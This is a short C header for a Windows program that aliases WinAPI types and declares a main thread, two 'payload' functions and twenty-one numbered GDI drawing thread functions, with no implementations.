#pragma once

#define winapi WINAPI
#define lpvoid LPVOID
#define dword DWORD
#define ulonglong ULONGLONG
#define uint UINT
#define rdtsc __rdtsc

#include <Windows.h>
#include <WinDef.h>
#include <WinNT.h>
#include <stdint.h>
#include <math.h>

DWORD WINAPI HolzerMain(LPVOID lpParam);

DWORD WINAPI payload2();
DWORD WINAPI payload3(LPVOID lpParam);

DWORD WINAPI gdi1(LPVOID lpParam);
DWORD WINAPI gdi2(LPVOID lpParam);
DWORD WINAPI gdi3(LPVOID lpParam);
DWORD WINAPI gdi4(LPVOID lpParam);
DWORD WINAPI gdi5(LPVOID lpParam);
DWORD WINAPI gdi6(LPVOID lpParam);
DWORD WINAPI gdi7(LPVOID lpParam);
DWORD WINAPI gdi8(LPVOID lpParam);
DWORD WINAPI gdi9(LPVOID lpParam);
DWORD WINAPI gdi10(LPVOID lpParam);
DWORD WINAPI gdi11(LPVOID lpParam);
DWORD WINAPI gdi12(LPVOID lpParam);
DWORD WINAPI gdi13(LPVOID lpParam);
DWORD WINAPI gdi14(LPVOID lpParam);
DWORD WINAPI gdi15(LPVOID lpParam);
DWORD WINAPI gdi16(LPVOID lpParam);
DWORD WINAPI gdi17(LPVOID lpParam);
DWORD WINAPI gdi18(LPVOID lpParam);
DWORD WINAPI gdi19(LPVOID lpParam);
DWORD WINAPI gdi20(LPVOID lpParam);
DWORD WINAPI gdi21(LPVOID lpParam);